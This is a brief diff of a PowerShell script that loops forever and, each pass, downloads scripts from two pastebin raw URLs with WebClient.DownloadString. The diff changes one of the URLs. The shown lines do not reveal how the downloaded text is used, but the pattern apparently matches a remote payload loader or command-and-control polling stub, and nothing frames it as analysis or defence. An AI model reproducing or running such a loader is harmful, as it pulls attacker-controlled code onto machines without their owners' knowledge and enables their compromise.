@@ -1,6 +1,6 @@
 While($true) {
     Try {       
-        $pastebinScriptUrl = 'https://pastebin.com/raw/dtbHc0Pd'
+        $pastebinScriptUrl = 'https://pastebin.com/raw/b9j9rc8N'
         $pastebinScriptUrl2 = 'https://pastebin.com/raw/5nGTwEY8'
         $i = (New-Object System.Net.WebClient).DownloadString($pastebinScriptUrl)
         $p = (New-Object System.Net.WebClient).DownloadString($pastebinScriptUrl2)
